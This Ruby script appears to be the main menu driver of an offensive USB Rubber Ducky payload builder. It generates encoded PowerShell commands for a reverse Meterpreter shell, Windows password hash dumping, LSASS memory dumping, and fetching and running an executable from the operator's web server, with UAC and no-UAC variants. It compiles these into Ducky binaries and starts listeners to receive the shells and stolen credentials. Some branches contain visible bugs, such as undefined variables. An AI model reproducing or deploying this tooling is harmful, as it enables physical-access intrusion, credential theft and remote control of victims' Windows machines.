#!/usr/bin/env ruby
#require './lib/core'
require_relative './lib/core'
require './lib/menu'
require './lib/server_setup'
require './lib/powershell_commands'
require './lib/ducky_setup'
include MainCommands
include MsfCommands
include Menu
include DuckySetUp
def server(attack)
  @server_setup = ServerSetUp.new
  host = @server_setup.get_host
  if attack == 'hash_dump'
  port = @server_setup.get_port
    powershell_command = PowershellCommands.new.hash_dump(host,port)
    return host,port,powershell_command
  elsif attack == 'lsass_dump'
  port = @server_setup.get_port
    powershell_command1,powershell_command2 = PowershellCommands.new.lsass_dump(host,port)
    return host,port,powershell_command1,powershell_command2
  elsif attack == 'wget'
    file_path = Readline.readline("#{get_input('Enter full path to executable: ')} ", true)
    random_name = Readline.readline("#{get_input('Would you like to randomize the file name?[yes/no] ')} ", true)
    if random_name == 'yes'
      print_info("Creating Radom Name!\n")
      rand_name = random_name_gen
      executable = file_path.split('/')[-1]
      executable = file_path.gsub(executable,rand_name)
    else
      executable = file_path.split('/')[-1]
    end
    print_info("Copying #{file_path} to '/var/www/'\n")
    FileUtils.copy(file_path,'/var/www/')
    powershell_command = PowershellCommands.new.wget_powershell(host,executable)
    return powershell_command
  end
end
def meterpreter_setup     
  server_setup = ServerSetUp.new
  host = server_setup.get_host
  port = server_setup.get_port
  shellcode = generate_shellcode(host,port)
  powershell_command = PowershellCommands.new.reverse_meterpreter(shellcode)
  return powershell_command,host,port
end
def start_msf(host,port)
  msf = Readline.readline("#{get_input('Would you like to start the Metasploit Listener[yes/no]')} ", true)
  msf == 'yes' ? metasploit_setup(host,port) : print_info("Goody Bye!\n")
end
def start_hash_server(port)
  hash = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
  hash == 'yes' ? @server_setup.hash_server(port) : print_info("Goody Bye!\n")
end
def start_lsass_server(port)
  lsass = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
  lsass == 'yes' ? @server_setup.lsass_server(port) : print_info("Goody Bye!\n")
end
def case_main_menu
  answer = main_menu
  case answer
    when '1'
      case_reverse_meterpreter_menu
    when '2'
      case_dump_hashes_menu
    when '3'
      case_dump_lsass_menu
    when '4'
      case_wget_menu
    when '99'
      exit
    else
      print_error("Bad Choice")
      sleep(1)
      case_main_menu
    end
end
def case_reverse_meterpreter_menu
  reverse_meterpreter_answer = reverse_meterpreter
  case reverse_meterpreter_answer
    when '1'
      powershell_command,host,port = meterpreter_setup
      print_info("Creating Text File!\n")
      meterpreter_uac(encode_command(powershell_command))
      print_info("Compiling Text to Bin!\n")
      compile_reverse_meterpreter
      start_msf(host,port)
    when '2'
      powershell_command,host,port = meterpreter_setup
      print_info("Creating Text File!\n")
      meterpreter_no_uac(encode_command(powershell_command))
      print_info("Compiling Text to Bin!\n")
      compile_reverse_meterpreter
      start_msf(host,port)
	  when '3'
      powershell_command,host,port = meterpreter_setup
      print_info("Creating Text File!\n")
      meterpreter_low(encode_command(powershell_command))
      print_info("Compiling Text to Bin!\n")
      compile_reverse_meterpreter
      start_msf(host,port)
    when '99'
      case_main_menu
    else
      print_error("Bad Choice")
      sleep(1)
      case_reverse_meterpreter_menu
    end
end
def case_dump_hashes_menu
  attack = 'hash_dump'
  dump_hashes_answer = dump_hashes
  case dump_hashes_answer
    when '1'
      host,port,powershell_command = server(attack)
      print_info("Creating Text File!\n")
      hash_dump_uac(encode_command(powershell_command))
      print_info("Compiling Text to Bin!\n")
      compile_hash_dump
      start_hash_server(port)
    when '2'
      host,port,powershell_command = server(attack)
      print_info("Creating Text File!\n")
      hash_dump_no_uac(encode_command(powershell_command))
      print_info("Compiling Text to Bin!\n")
      compile_hash_dump
      start_hash_server(port)
    when '99'
      case_main_menu
    else
      print_error("Bad Choice")
      sleep(1)
      case_dump_hashes_menu
    end
end
def case_dump_lsass_menu
  attack = 'lsass_dump'
  dump_lsass_answer = dump_lsass
  case dump_lsass_answer
    when '1'
      host,port,powershell_command1,powershell_command2 = server(attack)
      print_info("Creating Text File!\n")
      lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
      print_info("Compiling Text to Bin!\n")
      compile_hash_dump
      start_lsass_server(port)
    when '2'
      host,port,powershell_command = server(attack)
      print_info("Creating Text File!\n")
      lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
      print_info("Compiling Text to Bin!\n")
      compile_hash_dump
      start_lsass_server(port)
    when '99'
      case_main_menu
    else
      print_error("Bad Choice")
      sleep(1)
      case_dump_lsass_menu
    end 
end
def case_wget_menu
  attack = 'wget'
  ServerSetUp.new.web_server
  wget_answer = powershell_wget
  case wget_answer
    when '1'
     powershell_command,executable = server(attack)
     print_info("Creating Text File!\n")
     wget_uac(encode_command(powershell_command))
     print_info("Compiling Text to Bin!\n")
     compile_wget
    when '2'
     powershell_command,executable = server(attack)
     print_info("Creating Text File!\n")
     wget_no_uac(encode_command(powershell_command))
     print_info("Compiling Text to Bin!\n")
     compile_wget
    when '3'
     powershell_command,executable = server(attack)
     print_info("Creating Text File!\n")  
     wget_low(encode_command(powershell_command))
     print_info("Compiling Text to Bin!\n")
     compile_wget
    when '99'
      case_main_menu
    else
      print_error("Bad Choice")
      sleep(1)
      case_dump_lsass_menu
  end
end
begin
  case_main_menu
end
